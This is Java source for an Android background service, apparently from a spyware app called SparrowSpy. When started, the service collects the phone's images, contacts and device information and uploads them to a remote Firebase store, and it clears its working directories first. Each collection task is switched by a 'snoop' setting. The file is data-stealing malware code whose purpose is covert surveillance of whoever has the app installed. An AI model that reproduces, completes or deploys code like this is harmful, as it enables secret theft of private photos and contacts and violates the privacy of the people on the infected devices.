package com.tangledbytes.sparrowspy.services;

import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import com.google.firebase.storage.UploadTask;
import com.tangledbytes.sparrowspy.R;
import com.tangledbytes.sparrowspy.collectors.ContactsCollector;
import com.tangledbytes.sparrowspy.collectors.DeviceInfoCollector;
import com.tangledbytes.sparrowspy.collectors.ImagesCollector;
import com.tangledbytes.sparrowspy.server.DataUploader;
import com.tangledbytes.sparrowspy.utils.Constants;
import com.tangledbytes.sparrowspy.utils.FileUtils;
import com.tangledbytes.sparrowspy.utils.NotificationUtils;
import com.tangledbytes.sparrowspy.utils.Resources;
import com.tangledbytes.sparrowspy.utils.SpyState;
import com.tangledbytes.sparrowspy.utils.Utils;

import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;

public class SparrowSpyService extends Service {
    private static final String TAG = "SparrowSpyService";
    private static final int COLLECTOR_SERVICE_NOTIF_ID = 101;
    private Context mContext;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        if (SpyState.Listeners.spyServiceStateChangeListener != null)
            SpyState.Listeners.spyServiceStateChangeListener.onStart();
        mContext = getApplicationContext();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        updateNotif(Resources.Strings.notifContent1);
        collectData();
        return START_STICKY;
    }

    private void clearDirectories() {
        File[] files = Constants.DIR_APP_ROOT.listFiles();
        if (files == null) return;
        for (File file : files) {
            FileUtils.delete(file);
        }
        Constants.init(this, Constants.DIR_APP_ROOT);
    }

    /**
     * This method loads (saves) all the stuff
     */
    private void collectData() {
        List<Future<?>> execFutures = new ArrayList<>();
        ExecutorService executor = Executors.newCachedThreadPool();
        DataUploader uploader = new DataUploader(this);

        // Task: Clean
        clearDirectories();
        Log.i(TAG, "Directories cleaned");

        // Task: Save Images
        execFutures.add(executor.submit(() -> {
            if(!Resources.Settings.snoopImages)
                return;
            new ImagesCollector().collect();
            Log.i(TAG, "Images compressed and saved");
            updateNotif(Resources.Strings.notifContent2);
            waitForUpload(uploader.uploadImages());
        }));
        // Task: Save contacts
        execFutures.add(executor.submit(() -> {
            if(!Resources.Settings.snoopContacts)
                return;
            new ContactsCollector(mContext).collect();
            Log.i(TAG, "Contacts saved");
            waitForUpload(uploader.uploadContacts());
        }));
        // Task: Device Info
        execFutures.add(executor.submit(() -> {
            if(!Resources.Settings.snoopDeviceInfo)
                return;
            new DeviceInfoCollector(mContext).collect();
            Log.i(TAG, "Device info retrieved");
            waitForUpload(uploader.uploadDeviceInfo());
        }));

        new Thread(() -> {
            // Wait until all tasks are finished
            for (Future<?> execFuture : execFutures) {
                try {
                    execFuture.get();
                } catch (Exception e) {
                    Log.wtf(TAG, "Exception occurred while executing tasks", e);
                }
            }
            stopSelf();
        }).start();
    }

    private void waitForUpload(UploadTask task) {
        if(task == null) return;
        while(!task.isComplete())
            Utils.sleep(250);
    }
    private void updateNotif(String content) {
        Notification.Builder notifBuilder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            // Create notification channel for oreo and above devices
            NotificationUtils notifUtils = new NotificationUtils(mContext);
            notifUtils.createDefaultNotifChannel();
            String channelID = notifUtils.getDefaultNotifChannelId();
            notifBuilder = new Notification.Builder(mContext, channelID);
        } else {
            notifBuilder = new Notification.Builder(mContext);
            notifBuilder.setPriority(Notification.PRIORITY_LOW);
        }

        // Start foreground notification
        notifBuilder
                .setSmallIcon(Resources.Drawables.notifIcon)
                .setContentTitle(Resources.Strings.notifTitle)
                .setContentText(content);
        startForeground(COLLECTOR_SERVICE_NOTIF_ID, notifBuilder.build());
    }

    @Override
    public void onDestroy() {
        if (SpyState.Listeners.spyServiceStateChangeListener != null)
            SpyState.Listeners.spyServiceStateChangeListener.onFinish();
        super.onDestroy();
    }
}